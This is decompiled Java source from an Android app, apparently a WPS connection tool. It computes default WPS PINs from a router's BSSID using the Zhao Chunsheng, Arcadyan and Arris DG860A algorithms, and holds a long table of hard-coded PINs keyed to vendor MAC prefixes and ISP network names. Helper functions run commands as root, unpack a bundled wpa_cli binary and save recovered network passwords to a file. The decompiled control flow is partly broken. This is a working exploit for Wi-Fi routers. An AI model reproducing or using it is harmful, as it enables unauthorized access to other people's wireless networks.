/*
 * Decompiled with CFR 0_115.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.content.res.Resources
 *  android.net.wifi.ScanResult
 *  android.os.Environment
 */
package com.ngb.wpsconnect;

import android.content.Context;
import android.content.res.Resources;
import android.net.wifi.ScanResult;
import android.os.Environment;
import com.ngb.wpsconnect.Network;
import com.ngb.wpsconnect.Password;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.Reader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Iterator;

public class Function {
    public static final String NOROOT = "norootdevice";

    private static int ArcadyanAlgorithm(String arrn) {
        int[] arrn2 = String.format("%05d", Integer.parseInt(arrn.replaceAll(":", "").substring(8, 12), 16));
        int[] arrn3 = new int[10];
        arrn3[6] = arrn2.charAt(1) & 15;
        arrn3[7] = arrn2.charAt(2) & 15;
        arrn3[8] = arrn2.charAt(3) & 15;
        arrn3[9] = arrn2.charAt(4) & 15;
        arrn2 = arrn.replaceAll(":", "");
        arrn = new int[arrn2.length()];
        int n2 = 0;
        do {
            if (n2 >= arrn.length) {
                arrn2 = new int[7];
                n2 = arrn3[6] + arrn3[7] + arrn[10] + arrn[11] & 15;
                int n3 = arrn3[8] + arrn3[9] + arrn[8] + arrn[9] & 15;
                arrn2[0] = arrn3[9] ^ n2;
                arrn2[1] = arrn3[8] ^ n2;
                arrn2[2] = arrn[9] ^ n3;
                arrn2[3] = arrn[10] ^ n3;
                arrn2[4] = arrn[10] ^ arrn3[9];
                arrn2[5] = arrn[11] ^ arrn3[8];
                arrn2[6] = arrn3[7] ^ n2;
                n2 = Integer.parseInt(String.format("%1X%1X%1X%1X%1X%1X%1X", arrn2[0], arrn2[1], arrn2[2], arrn2[3], arrn2[4], arrn2[5], arrn2[6]), 16) % 10000000;
                return n2 * 10 + Function.wpsChecksum(n2);
            }
            arrn[n2] = Integer.parseInt(String.valueOf(arrn2.charAt(n2)), 16) & 15;
            n2 = (byte)(n2 + 1);
        } while (true);
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Lifted jumps to return sites
     */
    private static int ArrisDG860AAlgorithm(String var0) {
        var6_1 = new long[6];
        var4_2 = 0;
        var0 = var0.split(":");
        var7_3 = new int[var0.length];
        var8_4 = new int[var0.length];
        var1_5 = 0;
        do {
            if (var1_5 >= var0.length) break;
            var7_3[var1_5] = Integer.valueOf(var0[var1_5], 16);
            var8_4[var1_5] = Integer.valueOf(var0[var1_5], 16);
            ++var1_5;
        } while (true);
        var2_6 = 0;
        do {
            block8 : {
                var1_5 = 0;
                var3_7 = 0;
                if (var2_6 >= 6) ** GOTO lbl20
                if (var8_4[var2_6] <= 30) ** GOTO lbl-1000
                ** GOTO lbl28
lbl20: // 1 sources:
                var1_5 = 0;
                do {
                    if (var1_5 >= 6) {
                        var1_5 = (int)(var4_2 % 10000000);
                        return var1_5 * 10 + Function.wpsChecksum(var1_5);
                    }
                    var4_2 += var6_1[var1_5] * (long)Function.FibGen(var1_5 + 16) + (long)var7_3[var1_5];
                    ++var1_5;
                } while (true);
lbl28: // 1 sources:
                var1_5 = var3_7;
                do {
                    if (var8_4[var2_6] <= 31) lbl-1000: // 2 sources:
                    {
                        if (var1_5 != 0) break;
                        if (var8_4[var2_6] < 3) {
                            var8_4[var2_6] = var8_4[0] + var8_4[1] + var8_4[2] + var8_4[3] + var8_4[4] + var8_4[5] - var8_4[var2_6];
                            if (var8_4[var2_6] > 255) {
                                var8_4[var2_6] = var8_4[var2_6] & 255;
                            }
                            var8_4[var2_6] = var8_4[var2_6] % 28 + 3;
                        }
                        var6_1[var2_6] = Function.FibGen(var8_4[var2_6]);
                        break block8;
                    }
                    var8_4[var2_6] = var8_4[var2_6] - 16;
                    ++var1_5;
                } while (true);
                var6_1[var2_6] = Function.FibGen(var8_4[var2_6]) + Function.FibGen(var1_5);
            }
            ++var2_6;
        } while (true);
    }

    private static int FibGen(int n2) {
        if (n2 == 1 || n2 == 2 || n2 == 0) {
            return 1;
        }
        return Function.FibGen(n2 - 1) + Function.FibGen(n2 - 2);
    }

    private static int ZhaoChunshengAlgorithm(String string2) {
        int n2 = Function.secondFragmentBSSID(string2) % 10000000;
        return n2 * 10 + Function.wpsChecksum(n2);
    }

    private static int ZhaoChunshengAlgorithmWithoutChecksum(String string2) {
        return Function.secondFragmentBSSID(string2) % 10000000;
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Lifted jumps to return sites
     */
    public static String[] calculePIN(Network var0) {
        var5_2 = var6_1 = new int[0];
        switch (Function.fragmentBSSID(var0.getBSSID())) {
            default: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID()), Function.ArcadyanAlgorithm(var0.getBSSID())};
                break;
            }
            case 311407: 
            case 2108353: 
            case 2645979: 
            case 3435475: 
            case 8435334: 
            case 8693988: 
            case 11826335: 
            case 12351088: 
            case 13160798: 
            case 13407904: 
            case 16268799: {
                var1_3 = Function.ZhaoChunshengAlgorithmWithoutChecksum(var0.getBSSID());
                var2_4 = Function.wpsChecksum(var1_3 + 8);
                var3_5 = Function.wpsChecksum(var1_3 + 14);
                var4_6 = Function.wpsChecksum(var1_3);
                var5_2 = new int[]{var1_3 * 10 + var4_6, (var1_3 + 8) * 10 + var2_4, (var1_3 + 14) * 10 + var3_5};
                break;
            }
            case 11826446: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 549729: 
            case 2099437: 
            case 13662901: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 6512: {
                var5_2 = new int[]{66026402};
                break;
            }
            case 16006753: {
                v0 = var5_2 = new int[2];
                v0[0] = 47158382;
                v0[1] = 69382161;
                break;
            }
            case 4213251: {
                var5_2 = new int[]{11866428};
                break;
            }
            case 6699: {
                v1 = var5_2 = new int[4];
                v1[0] = 15624697;
                v1[1] = 16495265;
                v1[2] = 88478760;
                v1[3] = 77775078;
                break;
            }
            case 3699392: {
                v2 = var5_2 = new int[2];
                v2[0] = 18836486;
                v2[1] = 20172527;
                break;
            }
            case 16577832: {
                var5_2 = new int[]{20329761};
                break;
            }
            case 3160562: {
                v3 = var5_2 = new int[8];
                v3[0] = 16538061;
                v3[1] = 16702738;
                v3[2] = 18355604;
                v3[3] = 88202907;
                v3[4] = 73767053;
                v3[5] = 43297917;
                v3[6] = 19756967;
                v3[7] = 13409708;
                break;
            }
            case 7637131: {
                v4 = var5_2 = new int[8];
                v4[0] = 43297917;
                v4[1] = 73767053;
                v4[2] = 88202907;
                v4[3] = 16538061;
                v4[4] = 16702738;
                v4[5] = 18355604;
                v4[6] = 19756967;
                v4[7] = 13409708;
                break;
            }
            case 10769007: {
                v5 = var5_2 = new int[8];
                v5[0] = 16538061;
                v5[1] = 88202907;
                v5[2] = 73767053;
                v5[3] = 16702738;
                v5[4] = 43297917;
                v5[5] = 18355604;
                v5[6] = 19756967;
                v5[7] = 13409708;
                break;
            }
            case 13685778: 
            case 14420762: {
                v6 = var5_2 = new int[8];
                v6[0] = 16538061;
                v6[1] = 16702738;
                v6[2] = 18355604;
                v6[3] = 88202907;
                v6[4] = 73767053;
                v6[5] = 43297917;
                v6[6] = 19756967;
                v6[7] = 13409708;
                break;
            }
            case 6048937: 
            case 6431549: 
            case 6438116: 
            case 6438399: 
            case 6444444: 
            case 6454622: 
            case 6461119: 
            case 6465764: 
            case 6469254: 
            case 6471791: 
            case 6473247: 
            case 6473492: 
            case 6474664: 
            case 6482043: 
            case 6954343: 
            case 6955837: 
            case 6962687: 
            case 6968276: 
            case 6968732: 
            case 6974419: 
            case 6978910: 
            case 6985407: 
            case 6990052: 
            case 6996079: 
            case 6997535: 
            case 6997780: 
            case 6998952: 
            case 6999486: 
            case 7000414: 
            case 7000423: 
            case 7486975: 
            case 7492564: 
            case 7493020: 
            case 7498707: 
            case 7503198: 
            case 7509695: 
            case 7514340: 
            case 7520367: 
            case 7522068: 
            case 7523240: 
            case 7523774: 
            case 7524702: 
            case 7530619: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 8821: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 558651: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 7391: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 40998: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 5265392: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 45068: 
            case 528501: 
            case 13122101: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 528500: {
                var5_2 = new int[]{20956455};
                break;
            }
            case 8396546: 
            case 14974201: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 8951: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 8767: {
                var5_2 = new int[]{48247818};
                break;
            }
            case 6582274: 
            case 11552890: 
            case 16259687: 
            case 16306449: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 5329: {
                v7 = var5_2 = new int[2];
                v7[0] = 15537782;
                v7[1] = 26848185;
                break;
            }
            case 6375: {
                v8 = var5_2 = new int[3];
                v8[0] = 15537782;
                v8[1] = 64637129;
                v8[2] = 22310298;
                break;
            }
            case 6146: {
                var5_2 = new int[]{16546615};
                break;
            }
            case 7967: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 9934: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 8180556: {
                var5_2 = new int[]{43944552};
                break;
            }
            case 3267: {
                var5_2 = var6_1;
                if (!var0.getESSID().contains("DartyBox")) {
                    var5_2 = new int[]{47392717};
                    break;
                }
                ** GOTO lbl406
            }
            case 10548161: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 3257: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 2642: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 6071197: 
            case 14183657: 
            case 14446916: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 12100486: {
                var5_2 = new int[]{20172527};
                break;
            }
            case 6042939: {
                v9 = var5_2 = new int[2];
                v9[0] = 95755212;
                v9[1] = 64874487;
                break;
            }
            case 13161379: {
                var5_2 = new int[]{21464065};
                break;
            }
            case 16260090: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 16289413: {
                if (var0.getESSID().contains("MOVISTAR")) {
                    v10 = var5_2 = new int[2];
                    v10[0] = 19117652;
                    v10[1] = 16035232;
                    break;
                }
                if (var0.getESSID().contains("JAZZTEL")) {
                    var5_2 = new int[]{20172527};
                    break;
                }
                v11 = var5_2 = new int[3];
                v11[0] = 19117652;
                v11[1] = 16035232;
                v11[2] = 20172527;
                break;
            }
            case 14450: {
                var5_2 = new int[]{18836486};
                break;
            }
            case 14991686: {
                if (var0.getESSID().contains("Vodafone")) {
                    var5_2 = new int[]{10009321};
                    break;
                }
            }
            case 14180756: {
                if (var0.getESSID().contains("MOVISTAR")) {
                    var5_2 = new int[]{71537573};
                    break;
                }
                if (var0.getESSID().contains("Vodafone")) {
                    var5_2 = new int[]{31348034};
                    break;
                }
                v12 = var5_2 = new int[2];
                v12[0] = 71537573;
                v12[1] = 31348034;
                break;
            }
            case 298296: {
                var5_2 = new int[]{71537573};
                break;
            }
            case 555596: 
            case 825023: 
            case 1358184: 
            case 7906953: 
            case 15256877: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 1885756: 
            case 5275229: 
            case 7614832: 
            case 8690854: 
            case 8913749: {
                if (var0.getESSID().contains("Vodafone")) {
                    var5_2 = new int[]{Function.ArcadyanAlgorithm(var0.getBSSID())};
                    break;
                }
                if (var0.getESSID().contains("Orange")) {
                    var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                    break;
                }
                var5_2 = new int[]{Function.ArcadyanAlgorithm(var0.getBSSID())};
                break;
            }
            case 15475517: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 7630: {
                var5_2 = new int[]{85560130};
                break;
            }
            case 7539: {
                var5_2 = new int[]{88420707};
                break;
            }
            case 7550: {
                var5_2 = new int[]{66026402};
                break;
            }
            case 8489: {
                v13 = var5_2 = new int[3];
                v13[0] = 82744458;
                v13[1] = 64637129;
                v13[2] = 22310298;
                break;
            }
            case 8593: {
                var5_2 = new int[]{97744757};
                break;
            }
            case 9217: {
                v14 = var5_2 = new int[2];
                v14[0] = 97744757;
                v14[1] = 31011193;
                break;
            }
            case 9239: {
                v15 = var5_2 = new int[2];
                v15[0] = 11446958;
                v15[1] = 31011193;
                break;
            }
            case 9628: {
                var5_2 = new int[]{19805672};
                break;
            }
            case 7449: {
                v16 = var5_2 = new int[3];
                v16[0] = 66026402;
                v16[1] = 64637129;
                v16[2] = 22310298;
                break;
            }
            case 9819: 
            case 6862543: 
            case 7900663: 
            case 12325889: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 13393230: {
                var5_2 = new int[]{Function.ZhaoChunshengAlgorithm(var0.getBSSID())};
                break;
            }
            case 312: {
                var5_2 = new int[]{35606543};
                break;
            }
            case 1482: {
                v17 = var5_2 = new int[2];
                v17[0] = 73851738;
                v17[1] = 76916144;
                break;
            }
            case 2949: {
                var5_2 = new int[]{70066647};
                break;
            }
            case 3313: {
                var5_2 = new int[]{30447028};
                break;
            }
            case 16051256: {
                v18 = var5_2 = new int[17];
                v18[0] = 3419724;
                v18[1] = 4898702;
                v18[2] = 5884889;
                v18[3] = 9165847;
                v18[4] = 11288879;
                v18[5] = 18674095;
                v18[6] = 19634173;
                v18[7] = 23380622;
                v18[8] = 26599625;
                v18[9] = 42768777;
                v18[10] = 44947477;
                v18[11] = 51660567;
                v18[12] = 52594809;
                v18[13] = 67971862;
                v18[14] = 72344071;
                v18[15] = 91726681;
                v18[16] = 95048147;
                break;
            }
            case 13676268: 
            case 14716908: {
                var5_2 = new int[]{235211};
                break;
            }
            case 14732110: {
                var5_2 = new int[]{62987523};
                break;
            }
            case 12632512: {
                var5_2 = new int[]{78985933};
                break;
            }
            case 12599054: {
                var5_2 = new int[]{25032918};
                break;
            }
            case 10494343: {
                var5_2 = new int[]{92442559};
                break;
            }
            case 9716818: {
                v19 = var5_2 = new int[2];
                v19[0] = 26023809;
                v19[1] = 93645348;
                break;
            }
            case 8146869: {
                v20 = var5_2 = new int[2];
                v20[0] = 72688656;
                v20[1] = 75332662;
                break;
            }
            case 7619585: {
                v21 = var5_2 = new int[3];
                v21[0] = 446747;
                v21[1] = 10052648;
                v21[2] = 27615126;
                break;
            }
            case 7480125: {
                var5_2 = new int[]{36228645};
                break;
            }
            case 6042510: {
                v22 = var5_2 = new int[17];
                v22[0] = 764025;
                v22[1] = 3015162;
                v22[2] = 4581277;
                v22[3] = 11765592;
                v22[4] = 15986511;
                v22[5] = 30414129;
                v22[6] = 30999022;
                v22[7] = 33685984;
                v22[8] = 39657053;
                v22[9] = 53842763;
                v22[10] = 60387400;
                v22[11] = 73968597;
                v22[12] = 78614062;
                v22[13] = 78963641;
                v22[14] = 82848439;
                v22[15] = 85776104;
                v22[16] = 91345080;
                break;
            }
            case 5806133: {
                var5_2 = new int[]{53890894};
                break;
            }
            case 5795215: {
                v23 = var5_2 = new int[2];
                v23[0] = 47158382;
                v23[1] = 69382161;
                break;
            }
            case 5269488: {
                var5_2 = new int[]{20064525};
                break;
            }
            case 3163802: 
            case 3409924: {
                v24 = var5_2 = new int[3];
                v24[0] = 19482417;
                v24[1] = 30592407;
                v24[2] = 95221021;
                break;
            }
            case 2117247: {
                var5_2 = new int[]{45197079};
                break;
            }
            case 1867493: {
                v25 = var5_2 = new int[2];
                v25[0] = 22609298;
                v25[1] = 60418579;
                break;
            }
            case 1706816: {
                var5_2 = new int[]{17068161};
                break;
            }
            case 20322: {
                var5_2 = new int[]{21207136};
                break;
            }
            case 18554: {
                var5_2 = new int[]{15471628};
                break;
            }
            case 9764: {
                var5_2 = new int[]{95374611};
                break;
            }
            case 9796: {
                var5_2 = new int[]{78202962};
                break;
            }
            case 9818: {
                var5_2 = new int[]{76971464};
                break;
            }
            case 7633: {
                var5_2 = new int[]{Function.ArrisDG860AAlgorithm(var0.getBSSID())};
            }
lbl406: // 3 sources:
            case 6421: 
            case 6652: 
            case 7631: 
            case 8100: 
            case 9500242: 
            case 16278420: 
            case 16285493: 
            case 16287177: 
            case 16288646: 
            case 16302918: 
            case 16313728: 
        }
        var0 = Arrays.copyOf(var5_2, var5_2.length + 1);
        var0[var0.length - 1] = 12345670;
        var5_2 = new String[var0.length];
        var1_3 = 0;
        do {
            if (var1_3 >= var0.length) {
                return var5_2;
            }
            var5_2[var1_3] = Function.paddingZeros(var0[var1_3]);
            var1_3 = (byte)(var1_3 + 1);
        } while (true);
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static String capabilitiesTypeResume(String string2) {
        if (string2.contains("WPA2")) {
            return "[WPA2]";
        }
        if (string2.contains("WPA")) {
            return "[WPA]";
        }
        if (string2.contains("WEP")) {
            return "[WEP]";
        }
        String string3 = string2;
        if (!string2.contains("ESS")) return string3;
        return "[OPEN]";
    }

    public static int convertToDecimal(String string2) {
        return Integer.valueOf(string2, 16);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected static boolean doBackup(ArrayList<Password> iterator, String string2, String string3) {
        Object object;
        Object object2 = null;
        try {
            object = new SimpleDateFormat("_ddMMyyyy");
            object = "network_backup" + object.format(new Date()) + ".txt";
            object2 = object = new FileOutputStream(String.valueOf(Environment.getExternalStorageDirectory().getPath()) + "/" + (String)object);
        }
        catch (FileNotFoundException var4_5) {
            var4_5.printStackTrace();
        }
        if (object2 == null) {
            return false;
        }
        object2 = new PrintWriter((OutputStream)object2);
        iterator = iterator.iterator();
        do {
            if (!iterator.hasNext()) {
                object2.close();
                return true;
            }
            object = (Password)iterator.next();
            object2.println(String.valueOf(string2) + " " + object.getNetName());
            object2.println(String.valueOf(string3) + " " + object.getNetPwd());
            object2.println("---------------------------------------");
        } while (true);
    }

    public static int fragmentBSSID(String arrstring) {
        arrstring = arrstring.split(":");
        return Integer.valueOf(String.valueOf(arrstring[0]) + arrstring[1] + arrstring[2], 16);
    }

    public static boolean hasWPSEnabled(ScanResult scanResult) {
        return scanResult.capabilities.contains("WPS");
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    protected static String invokeSU(String var0) {
        var1_7 = new StringBuilder();
        var2_8 = Runtime.getRuntime().exec("su");
        var4_9 = new DataOutputStream(var2_8.getOutputStream());
        var3_10 = new BufferedReader(new InputStreamReader(var2_8.getInputStream()));
        try {
            ** GOTO lbl17
            catch (InterruptedException var0_2) {
                return var1_7.toString();
            }
            catch (InterruptedException var0_3) {
                return var1_7.toString();
            }
            catch (IOException var0_5) {
                return "norootdevice";
            }
            catch (IOException var0_6) {
                return "norootdevice";
            }
lbl17: // 1 sources:
            var4_9.writeBytes(String.valueOf(var0) + "\n");
            var4_9.flush();
            var4_9.writeBytes("exit\n");
            var4_9.flush();
            var4_9.close();
            do {
                if ((var0 = var3_10.readLine()) == null) {
                    var3_10.close();
                    var2_8.waitFor();
                    var2_8.destroy();
                    return var1_7.toString();
                }
                var1_7.append(String.valueOf(var0) + "\n");
            } while (true);
        }
        catch (IOException var0_1) {
            return "norootdevice";
        }
        catch (InterruptedException var0_4) {
            return var1_7.toString();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected static String loadLib(Context context) {
        if (context.getFileStreamPath("wpa_cli").exists()) return context.getFileStreamPath("wpa_cli").getAbsolutePath();
        InputStream inputStream = context.getResources().openRawResource(2130968576);
        try {
            byte[] arrby = new byte[inputStream.available()];
            inputStream.read(arrby);
            inputStream.close();
            FileOutputStream fileOutputStream = context.openFileOutput("wpa_cli", 0);
            fileOutputStream.write(arrby);
            fileOutputStream.close();
            context.getFileStreamPath("wpa_cli").setExecutable(true);
            return context.getFileStreamPath("wpa_cli").getAbsolutePath();
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
            return context.getFileStreamPath("wpa_cli").getAbsolutePath();
        }
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private static String paddingZeros(int n2) {
        String string2 = String.valueOf(n2);
        n2 = (byte)string2.length();
        String string3 = string2;
        if (n2 >= 8) return string3;
        while (n2 < 8) {
            string2 = "0".concat(string2);
            n2 = (byte)(n2 + 1);
        }
        return string2;
    }

    public static int secondFragmentBSSID(String arrstring) {
        arrstring = arrstring.split(":");
        return Integer.valueOf(String.valueOf(arrstring[3]) + arrstring[4] + arrstring[5], 16);
    }

    private static int wpsChecksum(int n2) {
        int n3 = 0;
        int n4 = n2;
        n2 = n3;
        while (n4 > 0) {
            n3 = n4 / 10;
            n2 = n2 + n4 % 10 * 3 + n3 % 10;
            n4 = n3 / 10;
        }
        return (10 - n2 % 10) % 10;
    }
}

